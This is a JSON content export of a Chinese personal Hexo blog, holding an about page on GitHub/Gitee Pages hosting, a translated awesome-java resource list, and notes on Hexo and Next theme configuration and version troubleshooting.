{"meta":{"title":"咸鱼","subtitle":"咸鱼是以盐腌渍后，晒干的鱼","description":"做人如果没有梦想,和咸鱼有什么区别呢?","author":"KevinWen","url":"http://yoursite.com"},"pages":[{"title":"","date":"2017-12-23T07:09:58.000Z","updated":"2021-12-28T03:24:10.324Z","comments":true,"path":"categories/index.html","permalink":"http://yoursite.com/categories/index.html","excerpt":"","text":""},{"title":"","date":"2017-12-23T07:09:51.000Z","updated":"2021-12-28T03:24:10.323Z","comments":true,"path":"about/index.html","permalink":"http://yoursite.com/about/index.html","excerpt":"","text":"本站点托管在 【Github Pages】 和 【Gitee Pages】。 Github Pages 在Github创建一个 账号同名.github.io 项目仓库，如：kevinvane.github.io 在项目的跟目录配置文件_config.yml中加入仓库的地址 在本地用 hexo g生成静态文件 用 hexo d 部署（push到仓库） 访问: https://kevinvane.github.io 。 Gitee Pages 在Gitee创建一个账号同名项目仓库，如：kevinvane。 把本项目源码托管到这个仓库，开启Pages服务。 进入Pages服务页面，手动部署更新 访问: https://kevinvane.gitee.io 。"},{"title":"","date":"2018-12-07T04:21:12.000Z","updated":"2021-12-30T08:56:16.474Z","comments":true,"path":"awesome-java/index.html","permalink":"http://yoursite.com/awesome-java/index.html","excerpt":"","text":"注意：本文来自awesome，点击阅读原文 最后更新: 2018-12-07 12:21:12 Java资源大全中文版我想很多程序员应该记得 GitHub 上有一个 Awesome - XXX 系列的资源整理。awesome-java 就是 akullpp 发起维护的 Java 资源列表，内容包括：构建工具、数据库、框架、模板、安全、代码分析、日志、第三方库、书籍、Java 站点等等。伯乐在线已经把 awesome-java 资源列表翻成中文后发布于 ImportNew。 Awesome 系列虽然挺全，但基本只对收录的资源做了极为简要的介绍，如果有更详细的中文介绍，对相应开发者的帮助会更大。这也是我们发起这个开源项目的初衷。 我们要做什么？ 基于 awesome-java 资源列表，我们将对各个资源项进行编译整理。 整理后的内容，将收录在伯乐在线资源频道。可参考已整理的内容： 《OWNER：Java配置文件解决方案》 《Spring Boot：简化Spring应用初始搭建以及开发过程》 《SonarQube：开源的代码质量管理工具》 目录 Java资源大全中文版 古董级工具 构建工具 字节码操作 集群管理 代码分析 编译器生成工具 外部配置工具 约束满足问题求解程序 持续集成 CSV解析 数据结构 数据库 时间日期工具库 依赖注入 开发流程增强工具 分布式应用 分布式数据库 发布 文档处理工具 函数式编程 游戏开发 GUI 高性能计算 IDE 图像处理 JSON JVM与JDK 基于JVM的语言 日志 机器学习 消息传递 杂项 应用监控工具 原生开发库 自然语言处理 网络 ORM PDF 性能分析 响应式开发库 REST框架 科学计算与分析 搜索引擎 安全 序列化 应用服务器 模板引擎 测试 通用工具库 网络爬虫 Web框架 业务流程管理套件 资源 社区 有影响力的书 播客 微博、微信公众号 Twitter 知名网站 古董级工具 这些工具伴随着Java一起出现，在各自辉煌之后还在一直使用。 Apache Ant：基于XML的构建管理工具。官网 cglib：字节码生成库。官网 GlassFish：应用服务器，由Oracle赞助支持的Java EE参考实现。官网 Hudson：持续集成服务器，目前仍在活跃开发。官网 JavaServer Faces：Mojarra是JSF标准的一个开源实现，由Oracle开发。官网 JavaServer Pages：支持自定义标签库的网站通用模板库。官网 Liquibase：与具体数据库独立的追踪、管理和应用数据库Scheme变化的工具。官网 构建工具 构建及应用依赖关系处理工具。 Apache Maven：Maven是一款声明式构建及依赖管理工具，采用约定优于配置方式进行管理。相对Apache Ant更推荐使用Maven，前者采用了过程式管理，维护相对困难。官网 Bazel：来自Google的构建工具，可以快速、可靠地构建代码。官网 Gradle：使用Groovy（非XML）进行增量构建，可以很好地与Maven依赖管理配合工作。官网 Buck：Facebook构建工具。官网 字节码操作 编程方式操作字节码的开发库。 ASM：通用底层字节码操作和分析开发库。官网 Byte Buddy：使用流式API进一步简化字节码生成。官网 Byteman：在运行时通过DSL（规则）操作字节码进行测试和故障排除。官网 Javassist：一个简化字节码编辑尝试。官网 集群管理 在集群内动态管理应用程序的框架。 Apache Aurora：Apache Aurora是一个Mesos框架，用于长时间运行服务和定时任务（cron job）。官网 Singularity：Singularity是一个Mesos框架，方便部署和操作。它支持Web Service、后台运行、调度作业和一次性任务。官网 代码分析 测量代码指标和质量工具。 Checkstyle：代码编写规范和标准静态分析工具。官网 Error Prone：将常见编程错误作为运行时错误报告。官网 FindBugs：通过字节码静态分析查找隐藏bug。官网 jQAssistant：使用基于Neo4J查询语言进行代码静态分析。官网 PMD：对源代码分析查找不良的编程习惯。官网 SonarQube：通过插件集成其它分析组件，对过去一段时间内的数据进行统计。官网 编译器生成工具 用来创建解析器、解释器或编译器的框架。 ANTLR：复杂的全功能自顶向下解析框架。官网 JavaCC：JavaCC是更加专门的轻量级工具，易于上手且支持语法超前预测。官网 外部配置工具 支持外部配置的开发库。 config：针对JVM语言的配置库。官网 owner：减少冗余配置属性。官网 约束满足问题求解程序 帮助解决约束满足问题的开发库。 Choco：可直接使用的约束满足问题求解程序，使用了约束规划技术。官网 JaCoP：为FlatZinc语言提供了一个接口，可以执行MiniZinc模型。官网 OptaPlanner：业务规划与资源调度优化求解程序。官网 Sat4J：逻辑代数与优化问题最先进的求解程序。官网 持续集成 Bamboo：Atlassian解决方案，可以很好地集成Atlassian的其他产品。可以选择开源许可，也可以购买商业版。官网 CircleCI：提供托管服务，可以免费试用。官网 Codeship：提供托管服务，提供有限的免费模式。官网 fabric8：容器集成平台。官网 Go：ThoughtWork开源解决方案。官网 Jenkins：支持基于服务器的部署服务。官网 TeamCity：JetBrain的持续集成解决方案，有免费版。官网 Travis：通常用作开源项目的托管服务。官网 Buildkite: 持续集成工具，用简单的脚本就能设置pipeline，而且能快速构建，可以免费试用。官网 CSV解析 简化CSV数据读写的框架与开发库 uniVocity-parsers：速度最快功能最全的CSV开发库之一，同时支持TSV与固定宽度记录的读写。官网 数据库 简化数据库交互的相关工具。 Apache Phoenix：HBase针对低延时应用程序的高性能关系数据库层。官网 Crate：实现了数据同步、分片、缩放、复制的分布式数据存储。除此之外还可以使用基于SQL的语法跨集群查询。官网 Flyway：简单的数据库迁移工具。官网 H2：小型SQL数据库，以可以作为内存数据库使用著称。官网 HikariCP：高性能JDBC连接工具。官网 JDBI：便捷的JDBC抽象。官网 jOOQ：为SQL schema生成typesafe代码。官网 MapDB：以磁盘或堆内存中并发集合为基础的嵌入式数据库引擎。官网 Presto：针对大数据的分布式SQL查询引擎。官网 Querydsl：Typesafe统一查询。官网 数据结构 Apache Parquet：Google Dremel论文中发布的基于组装算法的列式（Columnar）存储格式。官网 Protobuf：Google数据交换格式。官网 SBE：简单二进制编码，是最快速的消息格式之一。官网 Wire：整洁轻量级协议缓存。官网 时间日期工具库 处理时间和日期的开发库。 Joda-Time：在Java 8发布前，Joda-Time是实际使用的时间日期库标准。官网 Time4J：高级时间和日期库。官网 ThreeTen：JSR-310实现，为JDK提供更具特点的时间和日期API。官网 依赖注入 帮实现依赖翻转范式的开发库。 官网 Apache DeltaSpike：CDI扩展框架。官网 Dagger2：编译时注入框架，不需要使用反射。官网 Guice：可以匹敌Dagger的轻量级注入框架。官网 HK2：轻量级动态依赖注入框架。官网 开发流程增强工具 从最基本的层面增强开发流程。 ADT4J：针对代数数据类型的JSR-269代码生成器。官网 AspectJ：面向切面编程（AOP）的无缝扩展。官网 Auto：源代码生成器集合。官网 DCEVM：通过修改JVM在运行时支持对已加载的类进行无限次重定义。官网 HotswapAgent：支持无限次重定义运行时类与资源。官网 Immutables：类似Scala的条件类。官网 JHipster：基于Spring Boot与AngularJS应用程序的Yeoman源代码生成器。官网 JRebel：无需重新部署，可以即时重新加载代码与配置的商业软件。官网 Lombok：减少冗余的代码生成器。官网 Spring Loaded：类重载代理。官网 vert.x：多语言事件驱动应用框架。官网 分布式应用 用来编写分布式容错应用的开发库和框架。 Akka：用来编写分布式容错并发事件驱动应用程序的工具和运行时。官网 Apache Storm：实时计算系统。官网 Apache ZooKeeper：针对大型分布式系统的协调服务，支持分布式配置、同步和名称注册。官网 Hazelcast：高可扩展内存数据网格。官网 Hystrix：提供延迟和容错。官网 JGroups：提供可靠的消息传递和集群创建的工具。官网 Orbit：支持虚拟角色（Actor），在传统角色的基础上增加了另外一层抽象。官网 Quasar：为JVM提供轻量级线程和角色。官网 分布式数据库 对应用程序而言，在分布式系统中的数据库看起来就像是只有一个数据源。 Apache Cassandra：列式数据库，可用性高且没有单点故障。官网 Apache HBase：针对大数据的Hadoop数据库。官网 Druid：实时和历史OLAP数据存储，在聚集查询和近似查询方面表现不俗。官网 Infinispan：针对缓存的高并发键值对数据存储。官网 发布 以本机格式发布应用程序的工具。 Bintray：发布二进制文件版本控制工具。可以于Maven或Gradle一起配合使用。提供开源免费版本和几种商业收费版本。官网 Central Repository：最大的二进制组件仓库，面向开源社区提供免费服务。Apache Maven默认使用Central 官网Repository，也可以在所有其他构建工具中使用。 IzPack：为跨平台部署建立创作工具（Authoring Tool）。官网 JitPack：打包GitHub仓库的便捷工具。可根据需要构建Maven、Gradle项目，发布可立即使用的组件。官网 Launch4j：将JAR包装为轻量级本机Windows可执行程序。官网 Nexus：支持代理和缓存功能的二进制管理工具。官网 packr：将JAR、资源和JVM打包成Windows、Linux和Mac OS X本地发布文件。官网 文档处理工具 处理Office文档的开发库。 Apache POI：支持OOXML规范（XLSX、DOCX、PPTX）以及OLE2规范（XLS、DOC、PPT）。官网 documents4j：使用第三方转换器进行文档格式转换，转成类似MS Word这样的格式。官网 jOpenDocument：处理OpenDocument格式（由Sun公司提出基于XML的文档格式）。官网 函数式编程 函数式编程支持库。 Cyclops：支持一元（Monad）操作和流操作工具类、comprehension（List语法）、模式匹配、trampoline等特性。官网 Fugue：Guava的函数式编程扩展。官网 Functional Java：实现了多种基础和高级编程抽象，用来辅助面向组合开发（composition-oriented development）。官网 Javaslang：一个函数式组件库，提供持久化数据类型和函数式控制结构。官网 jOOλ：旨在填补Java 8 lambda差距的扩展，提供了众多缺失的类型和一组丰富的顺序流API。官网 游戏开发 游戏开发框架。 jMonkeyEngine：现代3D游戏开发引擎。官网 libGDX：全面的跨平台高级框架。官网 LWJGL：对OpenGL/CL/AL等技术进行抽象的健壮框架。官网 GUI 现代图形化用户界面开发库。 JavaFX：Swing的后继者。官网 Scene Builder：开发JavaFX应用的可视化布局工具。官网 高性能计算 涵盖了从集合到特定开发库的高性能计算相关工具。 Agrona：高性能应用中常见的数据结构和工具方法。官网 Disruptor：线程间消息传递开发库。官网 fastutil：快速紧凑的特定类型集合（Collection）。官网 GS Collections：受Smalltalk启发的集合框架。官网 HPPC：基础类型集合。官网 Javolution：实时和嵌入式系统的开发库。官网 JCTools：JDK中缺失的并发工具。官网 Koloboke：Hash set和hash map。官网 Trove：基础类型集合。官网 High-scale-lib:Cliff Click 个人开发的高性能并发库官网 IDE 简化开发的集成开发环境。 Eclipse：老牌开源项目，支持多种插件和编程语言。官网 IntelliJ IDEA：支持众多JVM语言，是安卓开发者好的选择。商业版主要针对企业客户。官网 NetBeans：为多种技术提供集成化支持，包括Java SE、Java EE、数据库访问、HTML5等。官网 Scala IDE：一款基于Eclipse开源平台打造的Scala集成开发环境。官网 SpringSource Tool Suite（STS）:一款基于Eclipse开源平台打造的Spring应用开发环境。官网 图像处理 创建、评价和操作图片的支持库。 Imgscalr：纯Java 2D实现，简单、高效、支持硬件加速的图像缩放开发库。官网 Picasso：安卓图片下载和图片缓存开发库。官网 Thumbnailator：Thumbnailator是一个高质量Java缩略图开发库。官网 ZXing：支持多种格式的一维、二维条形码图片处理开发库。官网 im4java: 基于ImageMagick或GraphicsMagick命令行的图片处理开发库，基本上ImageMagick能够支持的图片格式和处理方式都能够处理。官网 Apache Batik：在Java应用中程序以SVG格式显示、生成及处理图像的工具集，包括SVG解析器、SVG生成器、SVG DOM等模块，可以集成使用也可以单独使用，还可以扩展自定义的SVG标签。官网 JSON 简化JSON处理的开发库。 Genson：强大且易于使用的Java到JSON转换开发库。官网 Gson：谷歌官方推出的JSON处理库，支持在对象与JSON之间双向序列化，性能良好且可以实时调用。官网 Jackson：与GSON类似，在频繁使用时性能更佳。官网 LoganSquare：基于Jackson流式API，提供对JSON解析和序列化。比GSON与Jackson组合方式效果更好。官网 Fastjson：一个Java语言编写的高性能功能完善的JSON库。官网 Kyro：快速、高效、自动化的Java对象序列化和克隆库。官网 JVM与JDK 目前的JVM和JDK实现。 JDK 9：JDK 9的早期访问版本。官网 OpenJDK：JDK开源实现。官网 基于JVM的语言 除Java外，可以用来编写JVM应用程序的编程语言。 Scala：融合了面向对象和函数式编程思想的静态类型编程语言。官网 Groovy：类型可选（Optionally typed）的动态语言，支持静态类型和静态编译。目前是一个Apache孵化器项目。官网 Clojure：可看做现代版Lisp的动态类型语言。官网 Ceylon：RedHat开发的面向对象静态类型编程语言。官网 Kotlin：JetBrain针对JVM、安卓和浏览器提供的静态类型编程语言。官网 Xtend：一种静态编程语言，能够将其代码转换为简洁高效的Java代码，并基于JVM运行。官网 日志 记录应用程序行为日志的开发库。 Apache Log4j 2：使用强大的插件和配置架构进行完全重写。官网 kibana：分析及可视化日志文件。官网 Logback：强健的日期开发库，通过Groovy提供很多有趣的选项。官网 logstash：日志文件管理工具。官网 Metrics：通过JMX或HTTP发布参数，并且支持存储到数据库。官网 SLF4J：日志抽象层，需要与具体的实现配合使用。官网 机器学习 提供具体统计算法的工具。其算法可从数据中学习。 Apache Flink：快速、可靠的大规模数据处理引擎。官网 Apache Hadoop：在商用硬件集群上用来进行大规模数据存储的开源软件框架。官网 Apache Mahout：专注协同过滤、聚类和分类的可扩展算法。官网 Apache Spark：开源数据分析集群计算框架。官网 DeepDive：从非结构化数据建立结构化信息并集成到已有数据库的工具。官网 Deeplearning4j：分布式多线程深度学习开发库。官网 H2O：用作大数据统计的分析引擎。官网 Weka：用作数据挖掘的算法集合，包括从预处理到可视化的各个层次。官网 QuickML：高效机器学习库。官网、GitHub 消息传递 在客户端之间进行消息传递，确保协议独立性的工具。 Aeron：高效可扩展的单播、多播消息传递工具。官网 Apache ActiveMQ：实现JMS的开源消息代理（broker），可将同步通讯转为异步通讯。官网 Apache Camel：通过企业级整合模式（Enterprise Integration Pattern EIP）将不同的消息传输API整合在一起。官网 Apache Kafka：高吞吐量分布式消息系统。官网 Hermes：快速、可靠的消息代理（Broker），基于Kafka构建。官网 JBoss HornetQ：清晰、准确、模块化，可以方便嵌入的消息工具。官网 JeroMQ：ZeroMQ的纯Java实现。官网 Smack：跨平台XMPP客户端函数库。官网 Openfire：是开源的、基于XMPP、采用Java编程语言开发的实时协作服务器。 Openfire安装和使用都非常简单，并可利用Web界面进行管理。 官网 GitHub Spark：是一个开源，跨平台IM客户端。它的特性支持集组聊天，电话集成和强大安全性能。如果企业内部部署IM使用Openfire+Spark是最佳的组合。 官网 GitHub Tigase： 是一个轻量级的可伸缩的 Jabber/XMPP 服务器。无需其他第三方库支持，可以处理非常高的复杂和大量的用户数，可以根据需要进行水平扩展。 官网 杂项 未分类其它资源。 Design Patterns：实现并解释了最常见的设计模式。官网 Jimfs：内存文件系统。官网 Lanterna：类似curses的简单console文本GUI函数库。官网 LightAdmin：可插入式CRUD UI函数库，可用来快速应用开发。官网 OpenRefine：用来处理混乱数据的工具，包括清理、转换、使用Web Service进行扩展并将其关联到数据库。官网 RoboVM：Java编写原生iOS应用。官网 Quartz：强大的任务调度库.官网 应用监控工具 监控生产环境中应用程序的工具。 AppDynamics：性能监测商业工具。官网 JavaMelody：性能监测和分析工具。官网 Kamon：Kamon用来监测在JVM上运行的应用程序。官网 New Relic：性能监测商业工具。官网 SPM：支持对JVM应用程序进行分布式事务追踪的性能监测商业工具。官网 OverOps(Takipi)：产品运行时错误监测及调试商业工具。官网 原生开发库 用来进行特定平台开发的原生开发库。 JNA：不使用JNI就可以使用原生开发库。此外，还为常见系统函数提供了接口。官网 自然语言处理 用来专门处理文本的函数库。 Apache OpenNLP：处理类似分词等常见任务的工具。官网 CoreNLP：斯坦佛CoreNLP提供了一组基础工具，可以处理类似标签、实体名识别和情感分析这样的任务。官网 LingPipe：一组可以处理各种任务的工具集，支持POS标签、情感分析等。官网 Mallet：统计学自然语言处理、文档分类、聚类、主题建模等。官网 网络 网络编程函数库。 Async Http Client：异步HTTP和WebSocket客户端函数库。官网 Grizzly：NIO框架，在Glassfish中作为网络层使用。官网 Netty：构建高性能网络应用程序开发框架。官网 OkHttp：一个Android和Java应用的HTTP+SPDY客户端。官网 Undertow：基于NIO实现了阻塞和非阻塞API的Web服务器，在WildFly中作为网络层使用。官网 ORM 处理对象持久化的API。 Ebean：支持快速数据访问和编码的ORM框架。官网 EclipseLink：支持许多持久化标准，JPA、JAXB、JCA和SDO。官网 Hibernate：广泛使用、强健的持久化框架。Hibernate的技术社区非常活跃。官网 MyBatis：带有存储过程或者SQL语句的耦合对象（Couples object）。官网 OrmLite：轻量级开发包，免除了其它ORM产品中的复杂性和开销。官网 Nutz：另一个SSH。官网，Github，论坛 JFinal：JAVA WEB + ORM框架。官网，Github Apache OpenJPA: 实现了 EJB 3.0 中的 JPA 标准,为开发者提供功能强大、使用简单的持久化数据管理框架。 官网 PDF 用来帮助创建PDF文件的资源。 Apache FOP：从XSL-FO创建PDF。官网 Apache PDFBox：用来创建和操作PDF的工具集。官网 DynamicReports：JasperReports的精简版。官网 flyingsaucer：XML/XHTML和CSS 2.1渲染器。官网 iText：一个易于使用的PDF函数库，用来编程创建PDF文件。注意，用于商业用途时需要许可证。官网 JasperReports：一个复杂的报表引擎。官网 性能分析 性能分析、性能剖析及基准测试工具。 jHiccup：提供平台中JVM暂停的日志和记录。官网 JMH：JVM基准测试工具。官网 JProfiler：商业分析器。官网 LatencyUtils：测量和报告延迟的工具。官网 VisualVM：对运行中的应用程序信息提供了可视化界面。官网 YourKit Java Profiler：商业分析器。官网 响应式开发库 用来开发响应式应用程序的开发库。 Reactive Streams：异步流处理标准，支持非阻塞式反向压力（backpressure）。官网 Reactor：构建响应式快速数据（fast-data）应用程序的开发库。官网 RxJava：通过JVM可观察序列（observable sequence）构建异步和基于事件的程序。官网 REST框架 用来创建RESTful 服务的框架。 Dropwizard：偏向于自己使用的Web框架。用来构建Web应用程序，使用了Jetty、Jackson、Jersey和Metrics。官网 Feign：受Retrofit、JAXRS-2.0和WebSocket启发的HTTP客户端连接器（binder）。官网 Jersey：JAX-RS参考实现。官网 RESTEasy：经过JAX-RS规范完全认证的可移植实现。官网 RestExpress：一个Java类型安全的REST客户端。官网 RestX：基于注解处理和编译时源码生成的框架。官网 Retrofit：类型安全的REST客户端。官网 Spark：受到Sinatra启发的Java REST框架。官网 Swagger：Swagger是一个规范且完整的框架，提供描述、生产、消费和可视化RESTful Web Service。官网 Blade：国人开发的一个轻量级的MVC框架. 它拥有简洁的代码，优雅的设计。官网 科学计算与分析 用于科学计算和分析的函数库。 DataMelt：用于科学计算、数据分析及数据可视化的开发环境。官网 JGraphT：支持数学图论对象和算法的图形库。官网 JScience：用来进行科学测量和单位的一组类。官网 搜索引擎 文档索引引擎，用于搜索和分析。 Apache Solr：一个完全的企业搜索引擎。为高吞吐量通信进行了优化。官网 Elasticsearch：一个分布式、支持多租户（multitenant）全文本搜索引擎。提供了RESTful Web接口和无schema的JSON文档。官网 Apache Lucene：是一个开放源代码的全文检索引擎工具包，是一个全文检索引擎的架构，提供了完整的查询引擎和索引引擎，部分文本分析引擎。官网 安全 用于处理安全、认证、授权或会话管理的函数库。 Apache Shiro：执行认证、授权、加密和会话管理。官网 Bouncy Castle，涵盖了从基础的帮助函数到PGP/SMIME操作。官网：多途加密开发库。支持JCA提供者（JCA provider) Cryptomator：在云上进行客户端跨平台透明加密。官网 Keycloak：为浏览器应用和RESTful Web Service集成SSO和IDM。目前还处于beta版本，但是看起来非常有前途。官网 PicketLink：PicketLink是一个针对Java应用进行安全和身份认证管理的大型项目（Umbrella Project）。官网 序列化 用来高效处理序列化的函数库。 FlatBuffers：高效利用内存的序列化函数库，无需解包和解析即可高效访问序列化数据。官网 Kryo：快速、高效的对象图形序列化框架。官网 FST：提供兼容JDK的高性能对象图形序列化。官网 MessagePack：一种高效的二进制序列化格式。官网 应用服务器 用来部署应用程序的服务器。 Apache Tomcat：针对Servlet和JSP的应用服务器，健壮性好且适用性强。官网 Apache TomEE：Tomcat加Java EE。官网 Jetty：轻量级、小巧的应用服务器，通常会嵌入到项目中。官网 WebSphere Liberty：轻量级、模块化应用服务器，由IBM开发。官网 WildFly：之前被称作JBoss，由Red Hat开发。支持很多Java EE功能。官网 模板引擎 在模板中替换表达式的工具。 Apache Velocity：提供HTML页面模板、email模板和通用开源代码生成器模板。官网 FreeMarker：通用模板引擎，不需要任何重量级或自己使用的依赖关系。官网 Handlebars.java：使用Java编写的模板引擎，逻辑简单，支持语义扩展（semantic Mustache）。官网 Thymeleaf：旨在替换JSP，支持XML文件的工具。官网 Beetl：新一代的模板引擎，功能强大，性能良好，超过当前流行的模板引擎。而且还易学易用。官网 测试 测试内容从对象到接口，涵盖性能测试和基准测试工具。 Apache JMeter：功能性测试和性能评测。官网 Arquillian：集成测试和功能行测试平台，集成Java EE容器。官网 AssertJ：支持流式断言提高测试的可读性。官网 Awaitility：用来同步异步操作的DSL。官网 Cucumber：BDD测试框架。官网 Gatling：设计为易于使用、可维护的和高性能负载测试工具。官网 Hamcrest：可用来灵活创建意图（intent）表达式的匹配器。官网 JMockit：用来模拟静态、final方法等。官网 JUnit：通用测试框架。官网 Mockito：在自动化单元测试中创建测试对象，为TDD或BDD提供支持。官网 PowerMock： 支持模拟静态方法、构造函数、final类和方法、私有方法以及移除静态初始化器的模拟工具。官网 REST Assured：为REST/HTTP服务提供方便测试的Java DSL。官网 Selenide：为Selenium提供精准的周边API，用来编写稳定且可读的UI测试。官网 Selenium：为Web应用程序提供可移植软件测试框架。官网 Spock：JUnit-compatible framework featuring an expressive Groovy-derived specification language.官网兼容JUnit框架，支持衍生的Groovy范的语言。 TestNG：测试框架。官网 Truth：Google的断言和命题（proposition）框架。官网 Unitils：模块化测试函数库，支持单元测试和集成测试。官网 WireMock：Web Service测试桩（Stub）和模拟函数。官网 通用工具库 通用工具类函数库。 Apache Commons：提供各种用途的函数，比如配置、验证、集合、文件上传或XML处理等。官网 args4j：命令行参数解析器。官网 CRaSH：为运行进行提供CLI。官网 Gephi：可视化跨平台网络图形化操作程序。官网 Guava：集合、缓存、支持基本类型、并发函数库、通用注解、字符串处理、I/O等。官网 JADE：构建、调试多租户系统的框架和环境。官网 javatuples：正如名字表示的那样，提供tuple支持。尽管目前tuple的概念还有留有争议。官网 JCommander：命令行参数解析器。官网 Protégé：提供存在论（ontology）编辑器以及构建知识系统的框架。官网 网络爬虫 用于分析网站内容的函数库。 Apache Nutch：可用于生产环境的高度可扩展、可伸缩的网络爬虫。官网 Crawler4j：简单的轻量级网络爬虫。官网 JSoup：刮取、解析、操作和清理HTML。官网 webmagic：一个可扩展的Java爬虫框架，架构类似Python的Scrapy。 Web框架 用于处理Web应用程序不同层次间通讯的框架。 Apache Tapestry：基于组件的框架，使用Java创建动态、强健的、高度可扩展的Web应用程序。官网 Apache Wicket：基于组件的Web应用框架，与Tapestry类似带有状态显示GUI。官网 Google Web Toolkit：一组Web开发工具集，包含在客户端将Java代码转为JavaScript的编译器、XML解析器、RCP 官网API、JUnit集成、国际化支持和GUI控件。 Grails：Groovy框架，旨在提供一个高效开发环境，使用约定而非配置、没有XML并支持混入（mixin）。官网 Ninja：Java全栈Web开发框架。非常稳固、快速和高效。官网 Pippo：小型、高度模块化的类Sinatra框架。官网 Play：使用约定而非配置，支持代码热加载并在浏览器中显示错误。官网 PrimeFaces：JSF框架，提供免费和带支持的商业版本。包括若干前端组件。官网 Ratpack：一组Java开发函数库，用于构建快速、高效、可扩展且测试完备的HTTP应用程序。官网 Spring Boot：微框架，简化了Spring新程序的开发过程。官网 Spring：旨在简化Java EE的开发过程，提供依赖注入相关组件并支持面向切面编程。官网 Vaadin：基于GWT构建的事件驱动框架。使用服务端架构，客户端使用Ajax。官网 Blade：国人开发的一个轻量级的MVC框架. 它拥有简洁的代码，优雅的设计。官网 业务流程管理套件 流程驱动的软件系统构建。 jBPM：非常灵活的业务流程管理框架，致力于构建开发与业务分析人员之间的桥梁。官网 Activity：轻量级工作流和业务流程管理框架。官网 github 资源 社区 r/java：Reddit的Java子社区。官网 stackoverflow：问答平台。官网 vJUG：虚拟Java用户组。官网 有影响力的书 具有广泛影响且值得阅读的Java经典书籍。 Effective Java (2nd Edition) Java 8 in Action Java Concurrency in Practice | Java并发编程实战 Thinking in Java | Java编程思想 Java Puzzlers | Java解惑 播客 可以一边编程一边听的东西。 Java Council：官网 Java Posse：Discontinued as of 02/2015.官网 微博、微信公众号 ImportNew：是最受欢迎的、专注Java技术分享的微信公众号。专注Java技术分享，包括Java基础技术、进阶技能、架构设计和Java技术领域动态等。 ImportNew 微博：@ImportNew Twitter Adam Bien：自由职业者、作家、JavaONE明星演讲者、顾问、Java Champion。 Antonio Goncalves：Java Champion、JUG Leader、Devoxx France、Java EE 6/7、JCP、作家。 Arun Gupta：Java Champion、JavaONE明星演讲者、JUG Leader、Devoxx4Kids成员、Red Hatter。 Bruno Borges：Oracle产品经理、Java Jock。 Ed Burns：Oracle技术团队顾问。 Eugen Paraschiv：Spring安全课程作者。 James Weaver：Java、JavaFX、IoT开发者、作者和演讲者。 Java EE：Java EE Twitter官方账号。 Java Magazine：Java杂志官方账号。 Java.net：Java.net官方账号。 Java：Java Twitter官方账号。 Javin Paul：知名Java博客作者。 Lukas Eder：Data Geekery（jOOQ）创始人兼CEO。 Mario Fusco：RedHatter、JUG协调、活跃讲师和作者。 Mark Reinhold：Oracle首席架构师、Java平台开发组。 Martijn Verburg：London JUG co-leader、演讲者、作家、Java Champion等。 OpenJDK：OpenJDK官方账号。 Reza Rahman：Java EE、GlassFish、WebLogic传道者、作家、演讲者、开源黑客。 Simon Maple：Java Champion、virtualJUG创始人、LJC leader、RebelLabs作者。 Stephen Colebourne： Java Champion、演讲者。 Tim Boudreau：作家、NetBeans大牛。 Trisha Gee：Java Champion、演讲者。 微博、微信公众号 ImportNew 微博：@ImportNew ImportNew：最受欢迎的、专注Java技术分享的微信公众号。专注Java技术分享，包括Java基础技术、进阶技能、架构设计和Java技术领域动态等。 知名网站 值得关注的Java技术站点。 中文站点 ImportNew（ImportNew 专注 Java 技术） 英文站点 Android Arsenal Google Java Style：官网 InfoQ：官网 Java Code Geeks Java, SQL, and jOOQ Java.net Javalobby JavaWorld：官网 JAXenter：官网 RebelLabs The Java Specialist’ Newsletter：官网 The Takipi Blog TheServerSide.com：服务器编程交流平台是一个老牌的IT信息网站，关注服务器端编程的，以Java和.Net周边信息为主。官网 Thoughts On Java Vanilla Java Vlad Mihalcea on Hibernate Voxxed OnJava：O’Reilly Java包含最新的Java技术资讯，优质代码，完全的实例和详解。官网"},{"title":"","date":"2017-12-23T07:09:42.000Z","updated":"2021-12-28T03:24:11.109Z","comments":true,"path":"tags/index.html","permalink":"http://yoursite.com/tags/index.html","excerpt":"","text":""},{"title":"","date":"2018-12-07T04:21:12.000Z","updated":"2021-12-30T09:17:19.632Z","comments":true,"path":"hexo/index.html","permalink":"http://yoursite.com/hexo/index.html","excerpt":"","text":"简介最早用 Hexo3.2.0 创建此站点（当前3.9.0），使用【Next 6.6.0】主题。 版本问题当前Hexo版本不支持比较新的Nodejs版本，但不要更新到 Hexo 5.0.x ，要面临以下问题（升级遇到后回退）： Next主题也要更新才能正常显示 新版本Next主题配置和旧版不一样 新版本Next布局可能会有变化 新版Hexo会删除一些Next依赖的组件 新版本Hexo图标显示不正确 后来更新了一版Hexo，这是最后更新的Hexo版本（当前20210611最新Hexo是5.4.0） 在执行hexo g &amp;&amp; hexo d部署命令会出错，可以通过降低nodejs的版本来解决1234567891011121314151617181920212223$ node -vv12.9.1$ hexo -vhexo: 3.4.4hexo-cli: 4.2.0os: Windows_NT 10.0.18363 win32 x64node: 12.9.1v8: 7.6.303.29-node.15uv: 1.31.0zlib: 1.2.11brotli: 1.0.7ares: 1.15.0modules: 72nghttp2: 1.39.2napi: 4llhttp: 1.1.4http_parser: 2.8.0openssl: 1.1.1ccldr: 35.1icu: 64.2tz: 2019aunicode: 12.1 如果依赖版本不对，删除当前目录下的 node_modules目录，重新执行 npm i 即可 。 记录本站的Next配置主配置文件123theme: nextpermalink: :title/ 主题配置文件1234567891011121314151617181920language: zh-CNscheme: Mistmenu: home: / || home categories: /categories/ || th tags: /tags/ || tags archives: /archives/ || archive about: /about/ || user hexo: /hexo/ || heartbeat avatar: http://www.qqzhi.com/uploadpic/2015-02-02/211841154.jpghighlight_theme: night eighties#主页不显示全文auto_excerpt: enable: true length: 500 创建菜单和页面12345678910111213root@bogon:/home/share/blog# hexo new page tagsINFO Created: /home/share/blog/source/tags/index.mdroot@bogon:/home/share/blog# hexo new page aboutINFO Created: /home/share/blog/source/about/index.mdroot@bogon:/home/share/blog# hexo new page categoriesINFO Created: /home/share/blog/source/categories/index.md#编辑各自的index.md#加入type: &quot;tags&quot;type: &quot;categories&quot;type: &quot;about&quot;#注释/删掉标题title 加本地搜索1$ npm install hexo-generator-searchdb --save 123456#站点配置文件search: path: search.xml field: post format: html limit: 10000 123#主题配置文件local_search: enable: true 更多的自定义配置传送门"},{"title":"","date":"2021-12-30T12:09:42.000Z","updated":"2021-12-30T09:05:42.044Z","comments":true,"path":"jdk-features/index.html","permalink":"http://yoursite.com/jdk-features/index.html","excerpt":"","text":"JDK 8-1 新特性 JDK 8-2 新特性 JDK 9 新特性 JDK 10 新特性 JDK 11 新特性 JDK 12 新特性 JDK 13 新特性 JDK 14 新特性 JDK 15 新特性 JDK 16 新特性 JDK 17 